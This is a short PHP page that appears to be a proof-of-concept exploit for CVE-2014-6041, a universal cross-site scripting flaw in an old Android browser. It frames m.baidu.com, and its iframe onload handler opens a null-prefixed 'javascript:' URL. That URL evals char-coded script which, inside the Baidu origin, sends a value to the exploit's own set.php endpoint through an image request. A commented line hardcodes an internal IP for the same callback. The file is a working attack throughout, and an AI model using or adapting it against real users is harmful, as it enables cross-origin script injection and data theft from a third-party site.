<?php
    // CVE-2014-6041
    // google漏洞编号 37383
    include "config.php";

    $code = $_GET['code'];
    $code = htmlspecialchars(strip_tags($code), ENT_QUOTES);
    $setPhp = $DOMAIN."/php/set.php?code=".$code."&suc=2";
    $str = "if(document.domain == 'm.baidu.com'){new Image().src='".$setPhp."';}";
    //$str = "if(document.domain == 'm.baidu.com'){new Image().src='http://10.20.230.142/uxss/src/php/set.php?code=".$code."&suc=2';}";

    $tmp = str_split($str);
    $result = array();

    foreach($tmp as $key => $value){
        $result[$key] = ord($value);
    }

    $input = implode(",", $result);

?>

<script>

</script>
<iframe name="m" id="m" src="http://m.baidu.com" onload="window.open('\u0000javascript:eval(String.fromCharCode(<?php echo $input;?>))','m')" >
 
   